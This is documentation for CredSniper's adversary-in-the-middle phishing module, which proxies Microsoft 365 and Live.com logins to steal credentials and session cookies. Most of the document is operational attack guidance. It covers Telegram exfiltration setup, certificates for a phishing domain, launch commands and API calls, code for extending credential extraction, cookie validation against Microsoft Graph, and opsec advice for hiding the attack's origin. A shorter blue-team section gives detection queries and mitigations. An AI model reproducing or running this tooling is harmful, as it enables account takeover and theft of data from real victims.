# CredSniper AiTM (Adversary-in-the-Middle) Documentation

## Overview

CredSniper now includes advanced **Adversary-in-the-Middle (AiTM)** capabilities that complement the existing Selenium-based credential harvesting. The AiTM functionality allows for **transparent session hijacking** by intercepting authentication cookies, making it significantly more effective against modern defenses.

### Key Features

- 🔄 **Proxy-First Architecture**: Attempts AiTM proxy attack first, falls back to Selenium if needed
- 🍪 **Session Cookie Interception**: Captures authenticated session cookies in real-time
- 🔍 **Automatic Cookie Validation**: Tests captured cookies to ensure they're still valid
- 📊 **HAR Traffic Capture**: Records complete HTTP traffic for analysis
- 🎯 **Microsoft Login Specialization**: Optimized for Office 365, Azure AD, and Live.com
- 📡 **Enhanced Telegram Reporting**: Detailed attack summaries with artifacts
- 🧪 **Comprehensive Testing**: Built-in test harness for validation

## Attack Flow Comparison

### Traditional Phishing (Existing)
1. Victim enters credentials on fake page
2. Selenium automation logs in with captured credentials
3. Session cookies extracted from browser
4. High chance of triggering security alerts

### AiTM Phishing (New)
1. Victim visits proxy URL (looks like real Microsoft login)
2. Proxy transparently forwards all traffic to real Microsoft
3. Session cookies intercepted during legitimate authentication
4. Victim authentication appears normal to security systems
5. Attacker gets valid session without triggering automation detections

## Installation & Setup

### Dependencies

The AiTM functionality requires additional Python packages:

```bash
cd CredSniper
pip install -r requirements.txt
```

New dependencies include:
- `mitmproxy` - Core proxy functionality
- `asyncio` - Asynchronous operations
- `aiofiles` - Asynchronous file operations
- `urllib3` - Enhanced HTTP client capabilities

### Environment Variables

Configure these environment variables for optimal operation:

```bash
# Required for Telegram exfiltration
export TELEGRAM_BOT_TOKEN="your_bot_token_here"
export TELEGRAM_CHAT_ID="your_chat_id_here"

# Optional AiTM configuration
export AITM_PROXY_PORT="8080"
export AITM_TARGET_DOMAIN="login.microsoftonline.com"
export AITM_TIMEOUT="60"
```

### SSL Certificate Configuration

For production deployments, you'll need valid SSL certificates to avoid browser warnings:

```bash
# Generate certificates for your domain
certbot certonly --standalone -d your-phishing-domain.com

# Copy certificates to CredSniper
cp /etc/letsencrypt/live/your-domain/fullchain.pem CredSniper/certs/
cp /etc/letsencrypt/live/your-domain/privkey.pem CredSniper/certs/
```

## Usage

### Basic AiTM Attack

Launch CredSniper with AiTM proxy enabled (default):

```bash
python3 credsniper.py \
  --module office365 \
  --final https://office.com \
  --hostname your-phishing-domain.com \
  --twofactor \
  --ssl
```

The system will automatically:
1. Start AiTM proxy on port 8080
2. Attempt proxy-based session hijacking first
3. Fall back to Selenium automation if proxy fails
4. Send results via Telegram with artifacts

### AiTM-Only Mode

To disable Selenium fallback and use only AiTM:

```python
# Modify office365.py load function call
def load(enable_2fa=True, use_aitm_proxy=True):
    module = Office365Module(enable_2fa, use_aitm_proxy)
    module.attack_mode = "aitm"  # Force AiTM only
    return module
```

### API Endpoints

CredSniper provides API endpoints for AiTM management:

```bash
# Check AiTM proxy status
curl "http://localhost/aitm/status?api_token=YOUR_TOKEN"

# Start AiTM proxy manually
curl -X POST "http://localhost/aitm/start?email=target@company.com&api_token=YOUR_TOKEN"

# Get attack results
curl "http://localhost/aitm/results?api_token=YOUR_TOKEN"
```

### Testing

Use the built-in test harness to validate functionality:

```bash
# Run all tests
python3 core/test_harness.py --save-artifacts --output test_results.json

# Test specific components
python3 core/test_harness.py --no-selenium --port 8081

# Custom test configuration
python3 core/test_harness.py --config test_config.json
```

Example `test_config.json`:
```json
{
  "test_email": "victim@targetcompany.com",
  "test_password": "TestPassword123!",
  "test_2fa": "123456",
  "proxy_port": 8082,
  "timeout": 45,
  "validate_cookies": true,
  "save_artifacts": true,
  "test_selenium_fallback": true
}
```

## Architecture Deep Dive

### AiTM Proxy Components

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│                 │    │                 │    │                 │
│     Victim      │───▶│   AiTM Proxy    │───▶│   Microsoft     │
│   (Browser)     │    │  (mitmproxy)    │    │  (Real Login)   │
│                 │    │                 │    │                 │
└─────────────────┘    └─────────────────┘    └─────────────────┘
                                │
                                ▼
                       ┌─────────────────┐
                       │                 │
                       │   CredSniper    │
                       │   (Analysis)    │
                       │                 │
                       └─────────────────┘
                                │
                                ▼
                       ┌─────────────────┐
                       │                 │
                       │    Telegram     │
                       │  (Exfiltration) │
                       │                 │
                       └─────────────────┘
```

### Key Classes

- **`AiTMProxy`**: Core mitmproxy-based interceptor
- **`AiTMManager`**: High-level proxy management
- **`Office365Module`**: Integrated attack coordinator
- **`CredSniperTestHarness`**: Validation and testing

### Data Flow

1. **Request Interception**: All victim requests are captured and analyzed
2. **Credential Extraction**: POST data is parsed for credentials
3. **Response Analysis**: Set-Cookie headers and tokens are captured
4. **Session Validation**: Captured cookies are tested against Microsoft Graph API
5. **Artifact Generation**: HAR files and debug data are created
6. **Telegram Exfiltration**: Results are sent with artifacts

## Captured Artifacts

### Cookie Data
```json
{
  "cookies": [
    {
      "timestamp": "2024-01-15T10:30:00Z",
      "raw_header": "ESTSAUTH=value; Path=/; HttpOnly; Secure",
      "parsed": {
        "name": "ESTSAUTH",
        "value": "captured_value",
        "path": "/",
        "httponly": true,
        "secure": true
      }
    }
  ]
}
```

### Traffic Logs (HAR Format)
- Complete request/response logs
- Headers, bodies, and timing information
- Compatible with browser developer tools
- Useful for analysis and debugging

### Validation Results
```json
{
  "validation": {
    "valid": true,
    "status_code": 200,
    "test_url": "https://graph.microsoft.com/v1.0/me",
    "response_size": 1024,
    "timestamp": "2024-01-15T10:31:00Z"
  }
}
```

## Configuration Options

### Proxy Settings

```python
# In core/aitm_proxy.py
proxy = AiTMProxy(
    target_domain="login.microsoftonline.com",  # Target to proxy
    proxy_port=8080,                           # Local proxy port
    victim_email="target@company.com"          # Expected victim
)
```

### Module Settings

```python
# In modules/office365/office365.py
module = Office365Module(
    enable_2fa=True,        # Enable 2FA capture
    use_aitm_proxy=True     # Enable AiTM proxy (vs Selenium only)
)
```

### Timeout Configuration

```bash
# Environment variables
export O365_WAIT_TIMEOUT="60"        # Selenium timeout
export AITM_PROXY_TIMEOUT="30"       # Proxy operation timeout
export AITM_VICTIM_WAIT="45"         # Time to wait for victim interaction
```

## Limitations & Considerations

### Technical Limitations

1. **DNS/Hosting Requirements**: 
   - Requires control of DNS for the phishing domain
   - SSL certificates needed for production use
   - May need to bypass corporate firewalls

2. **Detection Vectors**:
   - Proxy traffic patterns may be detectable
   - Certificate transparency logs expose domains
   - Network monitoring may identify proxy behavior

3. **Session Timeouts**:
   - Captured cookies have limited validity
   - Conditional Access policies may invalidate sessions
   - Token refresh may be required for long-term access

### Operational Limitations

1. **Victim Interaction Required**:
   - AiTM requires victim to actually authenticate
   - Unlike Selenium, cannot automate the victim's authentication
   - Timing dependent on victim behavior

2. **Network Dependencies**:
   - Requires stable network connection to Microsoft
   - Proxy must remain available during attack window
   - High bandwidth usage during active attacks

3. **Scale Limitations**:
   - Single proxy instance per attack
   - Multiple victims require multiple proxy instances
   - Resource intensive compared to static phishing pages

## Blue Team Detection & Mitigation

### Detection Strategies

#### 1. Certificate Transparency Monitoring
```bash
# Monitor for suspicious certificates
curl -s "https://crt.sh/?q=%.microsoft.com&output=json" | \
  jq '.[] | select(.not_after > now) | .common_name'
```

#### 2. Network Traffic Analysis
```python
# Look for proxy patterns in network logs
suspicious_patterns = [
    "reverse_proxy",
    "mitmproxy",
    "proxy_user_agent",
    "x-forwarded-for",
    "abnormal_cert_chain"
]
```

#### 3. Microsoft Sentinel Queries
```kql
// Detect AiTM login patterns
SigninLogs
| where TimeGenerated > ago(1h)
| where RiskState == "atRisk" or RiskLevelDuringSignIn == "high"
| where UserAgent contains "Mozilla" and ClientAppUsed == "Browser"
| project TimeGenerated, UserPrincipalName, IPAddress, Location, UserAgent
| join kind=inner (
    AADNonInteractiveUserSignInLogs
    | where TimeGenerated > ago(1h)
    | project TimeGenerated, UserPrincipalName, IPAddress
) on UserPrincipalName
| where abs(datetime_diff('minute', TimeGenerated, TimeGenerated1)) < 5
```

#### 4. Conditional Access Policies
```json
{
  "displayName": "Block suspicious login patterns",
  "conditions": {
    "signInRiskLevels": ["medium", "high"],
    "locations": {
      "includeLocations": ["All"],
      "excludeLocations": ["AllTrusted"]
    }
  },
  "grantControls": {
    "operator": "OR",
    "builtInControls": ["block"]
  }
}
```

### Mitigation Strategies

#### 1. User Education
- **Phishing Awareness Training**: Regular training on URL verification
- **Bookmark Usage**: Encourage bookmarking legitimate Microsoft portals
- **Certificate Verification**: Train users to check certificate details

#### 2. Technical Controls
- **FIDO2/WebAuthn**: Hardware-based authentication resistant to proxy attacks
- **Certificate Pinning**: Pin Microsoft certificates in corporate browsers
- **DNS Filtering**: Block known phishing domains and suspicious TLDs

#### 3. Monitoring & Response
- **Real-time Alerting**: Monitor for unusual login patterns
- **Session Analysis**: Detect impossible travel and simultaneous sessions
- **Automated Response**: Automatically revoke sessions from suspicious locations

#### 4. Network Security
- **Egress Filtering**: Block traffic to suspicious proxy servers
- **TLS Inspection**: Inspect encrypted traffic for proxy indicators
- **Geoblocking**: Block authentication from suspicious countries

### Incident Response Playbook

#### Immediate Actions (0-1 hour)
1. **Identify Scope**: Which users accessed the phishing domain?
2. **Revoke Sessions**: Invalidate all active sessions for affected users
3. **Reset Credentials**: Force password reset for compromised accounts
4. **Block Domain**: Add phishing domain to DNS/web filters

#### Short-term Actions (1-24 hours)
1. **Forensic Analysis**: Analyze proxy logs and traffic patterns
2. **IOC Distribution**: Share indicators with security community
3. **User Notification**: Inform affected users and provide guidance
4. **Policy Review**: Update Conditional Access policies

#### Long-term Actions (1-30 days)
1. **Security Assessment**: Review and improve security controls
2. **Training Update**: Enhance user security awareness training
3. **Monitoring Enhancement**: Improve detection capabilities
4. **Threat Intelligence**: Update threat models and IoCs

## Advanced Usage

### Custom Proxy Configurations

```python
# Custom target domains
proxy = AiTMProxy(
    target_domain="login.live.com",      # For personal Microsoft accounts
    proxy_port=8443,                     # Custom port
    victim_email="personal@outlook.com"
)

# Multiple domain support
domains = [
    "login.microsoftonline.com",
    "login.live.com", 
    "account.microsoft.com"
]

for i, domain in enumerate(domains):
    proxy = AiTMProxy(
        target_domain=domain,
        proxy_port=8080 + i,
        victim_email=f"victim{i}@company.com"
    )
```

### Custom Credential Extraction

```python
# Extend AiTMProxy for custom credential parsing
class CustomAiTMProxy(AiTMProxy):
    def _extract_credentials_from_post(self, content: str):
        super()._extract_credentials_from_post(content)
        
        # Custom field extraction
        custom_fields = ['custom_token', 'api_key', 'session_id']
        params = parse_qs(content)
        
        for field in custom_fields:
            if field in params:
                self.captured_data['credentials'][field] = params[field][0]
                self.log(f"[CAPTURE] Custom {field}: {params[field][0]}")
```

### Integration with External Tools

```python
# Export to external SIEM
def export_to_siem(captured_data):
    import requests
    
    siem_data = {
        'event_type': 'aitm_attack',
        'timestamp': datetime.datetime.utcnow().isoformat(),
        'victim_email': captured_data.get('credentials', {}).get('email'),
        'cookies_count': len(captured_data.get('cookies', [])),
        'session_valid': captured_data.get('session_info', {}).get('auth_success', False)
    }
    
    requests.post('https://siem-endpoint/events', json=siem_data)
```

## Troubleshooting

### Common Issues

#### 1. Proxy Won't Start
```bash
# Check port availability
netstat -tulpn | grep :8080

# Check permissions
sudo setcap CAP_NET_BIND_SERVICE=+eip $(which python3)

# Check firewall
sudo ufw allow 8080
```

#### 2. Certificate Errors
```bash
# Generate self-signed certificate for testing
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Use with mitmproxy
mitmdump --set confdir=~/.mitmproxy --ssl-insecure
```

#### 3. Cookie Validation Fails
```python
# Debug cookie validation
validation_result = proxy.validate_captured_cookies(
    test_url="https://graph.microsoft.com/v1.0/me/drive"
)
print(f"Validation result: {validation_result}")

# Check cookie format
for cookie_data in captured_data['cookies']:
    print(f"Cookie: {cookie_data['parsed']}")
```

#### 4. HAR File Issues
```python
# Validate HAR file structure
import json

with open('traffic.har', 'r') as f:
    har_data = json.load(f)

assert 'log' in har_data
assert 'entries' in har_data['log']
print(f"HAR entries: {len(har_data['log']['entries'])}")
```

### Debug Logging

```python
# Enable verbose logging
import logging
logging.basicConfig(level=logging.DEBUG)

# AiTM proxy logging
proxy = AiTMProxy()
proxy.logger.setLevel(logging.DEBUG)

# Save debug logs
with open('aitm_debug.log', 'w') as f:
    for entry in proxy.traffic_log:
        f.write(json.dumps(entry, indent=2) + '\n')
```

## Performance Optimization

### Memory Management
- Limit HAR log entries to prevent memory exhaustion
- Rotate log files for long-running operations
- Clean up temporary files after attacks

### Network Optimization
- Use connection pooling for validation requests
- Implement caching for repeated requests
- Optimize proxy buffer sizes

### Concurrent Operations
- Run multiple proxy instances for different targets
- Use async operations where possible
- Implement proper resource cleanup

## Security Considerations

### Operational Security
- Use VPNs or proxy chains to hide attack origin
- Rotate infrastructure frequently
- Implement proper log sanitization

### Data Protection
- Encrypt captured credentials at rest
- Use secure channels for data exfiltration
- Implement data retention policies

### Legal Compliance
- Ensure proper authorization for penetration testing
- Follow responsible disclosure practices
- Maintain audit trails for security assessments

## Conclusion

The AiTM functionality significantly enhances CredSniper's capabilities by providing a more sophisticated and stealthy approach to credential harvesting. By combining transparent proxy operations with existing Selenium automation, the toolkit offers both reliability and stealth.

Remember to use these capabilities responsibly and only in authorized penetration testing scenarios. The techniques documented here are powerful and should be used to improve organizational security rather than for malicious purposes.

For questions, issues, or contributions, please refer to the main CredSniper repository documentation.